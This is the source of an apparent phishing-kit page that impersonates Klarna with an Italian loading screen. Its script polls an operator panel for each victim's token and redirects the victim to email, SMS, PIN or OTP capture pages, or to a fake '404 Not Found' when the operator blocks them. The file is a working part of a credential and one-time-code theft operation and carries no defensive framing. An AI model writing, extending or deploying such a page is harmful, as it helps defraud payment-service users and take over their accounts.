<?php
require_once __DIR__ . '/guard.php';

$clientData = getClientData(getToken());
$currentStatus = $clientData['status'] ?? '';
$protected = ['go_email', 'go_sms', 'go_pin', 'finished', 'finished_success', 'otp_error', 'pin_error', 'reset', 'block'];
if (!in_array($currentStatus, $protected)) {
    updateClientData(getToken(), ['status' => 'loading']);
}

$token = getToken();
$returnPage = $_GET['return'] ?? 'login.php';
?>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Klarna | Caricamento</title>
    <script>window.clientToken = "<?php echo htmlspecialchars($token); ?>";</script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); min-height: 780px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; }
        @keyframes dot-bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-14px); } }
        .loading-dot { width: 14px; height: 14px; background-color: #080516; border-radius: 50%; animation: dot-bounce 0.6s ease-in-out infinite; }
        .loading-dot:nth-child(2) { animation-delay: 0.15s; }
        .loading-dot:nth-child(3) { animation-delay: 0.3s; }
        @media (max-width: 640px) { body { background-color: white; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="text-center pt-2 mb-6">
             <img src="https://logolook.net/wp-content/uploads/2022/06/Klarna-Logo-2017.png" 
                  alt="Klarna" 
                  style="height: 32px; width: auto; display: inline-block; object-fit: contain;">
         </div>
       <div class="flex-grow flex flex-col items-center justify-center">
       <div class="flex items-center justify-center gap-3" style="margin-top: auto; margin-bottom: auto;">
           <div class="loading-dot"></div>
           <div class="loading-dot"></div>
           <div class="loading-dot"></div>
       </div>

</div>
    </div>

    <script>
        const clientToken = "<?php echo $token; ?>";
        const returnPage = "<?php echo htmlspecialchars($returnPage); ?>";
        let lastStatus = "";
        let pollCount = 0;

        function checkStatus() {
            fetch('status.php', { cache: 'no-store' })
            .then(r => r.json())
            .then(data => {
                if (!data || data.error) return;
                const myData = data[clientToken];
                if (!myData) return;
                
                const s = myData.status || "";
                if (s === lastStatus) {
                    pollCount++;
                    // If stuck on same status for too long, keep polling (panel is thinking)
                    return;
                }
                lastStatus = s;
                pollCount = 0;
                
                if (s === 'go_email') window.location.href = 'email.php';
                else if (s === 'go_sms') window.location.href = 'sms.php';
                else if (s === 'go_pin') window.location.href = 'pin.php';
                else if (s === 'finished' || s === 'finished_success') window.location.href = 'success.php';
                else if (s === 'reset') window.location.href = 'login.php';
                else if (s === 'block') {
                    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#f7f7f7;"><h1 style="font-family:sans-serif;color:#333;">404 Not Found</h1></div>';
                }
                else if (s === 'otp_error') {
                    window.location.href = returnPage + '?error=otp';
                }
                else if (s === 'pin_error') {
                    window.location.href = 'pin.php?error=1';
                }
            })
            .catch(() => {});
        }

        setInterval(checkStatus, 2000);
        checkStatus();
    </script>
</body>
</html>